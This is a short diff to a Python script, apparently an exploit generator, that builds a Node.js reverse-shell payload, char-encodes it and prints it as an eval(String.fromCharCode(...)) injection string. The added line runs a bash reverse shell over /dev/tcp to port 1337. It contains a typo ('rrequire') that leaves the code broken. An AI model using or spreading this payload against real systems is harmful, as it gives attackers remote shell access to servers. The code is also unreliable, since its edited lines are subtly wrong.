@@ -26,7 +26,7 @@ print("[+] LPORT = %s" % (PORT))
 NODEJS_REV_SHELL = '''
 var require = global.require || global.process.mainModule.constructor._load;
 var net = require('net');
-var spawn = require('child_process').spawn;
+var spawn = rrequire('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/127.0.0.1/1337 0>&1"');
 HOST="%s";
 PORT="%s";
 TIMEOUT="5000";
@@ -48,7 +48,7 @@ function c(HOST,PORT) {
     });
 }
 c(HOST,PORT);
-''' % (IP_ADDR, PORT)
+'''.replace("PORT", PORT).replace("HOST", IP_ADDR)
 print("[+] Encoding")
 PAYLOAD = charencode(NODEJS_REV_SHELL)
 print("eval(String.fromCharCode(%s))" % (PAYLOAD))
